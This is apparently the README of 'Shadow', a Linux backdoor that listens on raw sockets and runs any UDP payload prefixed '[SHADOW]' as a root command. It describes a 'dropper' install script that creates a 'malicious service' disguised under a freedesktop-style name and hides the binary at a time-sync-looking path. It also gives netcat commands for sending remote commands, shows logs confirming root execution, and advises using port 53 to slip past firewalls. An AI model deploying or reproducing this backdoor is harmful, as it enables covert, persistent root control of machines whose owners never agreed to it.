# Shadow Packet
Super basic raw sockets implementation with BPF filtering. Data is not sent back to hosts, see [Keydra](https://github.com/DaveTheBearMan/Keydra) for a more complex raw sockets system with a custom packet type built on top UDP.


### What is Shadow
Shadow allows a client to listen to incoming traffic on the outward facing interface for any UDP packets not sent by the host, with the prefix `[SHADOW]` in the data section. The port, destination address, source address, etc, does not matter. Any data following the prefix will be run as a command. 

### How to use shadow
The dropper script install.sh will create a malicious service called `dbus-org.freedesktop.isolate1.service` that begins immediately and starts on boot. The binary is located at `/etc/ntpsvc/timesync.d`. The uninstall.sh script can be used to remove from a system.

### Success Example
In this example we see the basic functionality of shadow.
On some server:
```bash
dtbm@dev:~$ echo -n "[SHADOW]echo hello" | nc -4u -w1 100.64.12.61 900
```
On some client already running shadow binary:
```bash
dtbm@client:~$ sudo ./Shadow
  SOURCE IP         DEST IP           DATA
> 100.64.12.237     100.64.12.61      echo hello
< hello
```

### Fail Example
In this example, we can see that the commands are run as root, and it is fault tolerant.
From some server:
```bash
dtbm@dev:~$ echo -n "[SHADOW]whoami" | nc -4u -w1 100.64.12.61 900
dtbm@dev:~$ echo -n "[SHADOW]whocami" | nc -4u -w1 100.64.12.61 900
dtbm@dev:~$ echo -n "[SHADOW]whoami" | nc -4u -w1 100.64.12.61 900
```
On some client with shadow binary running already:
```bash
dtbm@stack:~/Shadow$ sudo ./Shadow
  SOURCE IP         DEST IP           DATA
> 100.64.12.237     100.64.12.61      whoami
< root

> 100.64.12.237     100.64.12.61      whocami
< ERROR: exit status 127
> 100.64.12.237     100.64.12.61      whoami
< root
``` 

### Service Install Example
In this example, the install command is first run on the client with root using sudo.
```bash
dtbm@client:~/Shadow$ sudo ./install.sh
--2025-12-22 08:38:25--  https://github.com/DaveTheBearMan/Shadow/raw/refs/heads/main/Shadow
Resolving github.com (github.com)... x.x.x.x
Connecting to github.com (github.com)|x.x.x.x|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/DaveTheBearMan/Shadow/refs/heads/main/Shadow [following]
--2025-12-22 08:38:25--  https://raw.githubusercontent.com/DaveTheBearMan/Shadow/refs/heads/main/Shadow
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|x.x.x.x|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2990375 (2.9M) [application/octet-stream]
Saving to: ‘/etc/ntpsvc/timesync.d’

/etc/ntpsvc/timesync.d                 100%[============================================================================>]   2.85M  --.-KB/s    in 0.06s

2025-12-22 08:38:25 (45.5 MB/s) - ‘/etc/ntpsvc/timesync.d’ saved [2990375/2990375]

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   890  100   890    0     0  13207      0 --:--:-- --:--:-- --:--:-- 13283
Created symlink /etc/systemd/system/multi-user.target.wants/dbus-org.freedesktop.isolate1.service → /etc/systemd/system/dbus-org.freedesktop.isolate1.service.

dtbm@client:~/Shadow$ ls ~
Shadow
```
Once the install script has been run, we run the following code from any host that can send traffic that is not blocked by a network firewall:
```bash
dtbm@server:~$ echo -n "[SHADOW]touch /home/dtbm/example.file" | nc -4u -w1 100.64.12.61 53
```
and when we examine on our client again, we can see:
```bash
dtbm@client:~/Shadow$ ls ~
Shadow example.file
```

In this example, we use port 53 (the same port as DNS) as an example of how to "get around" the network firewall limitation.
The most difficult aspect is likely to be UDP being drop all at a network level.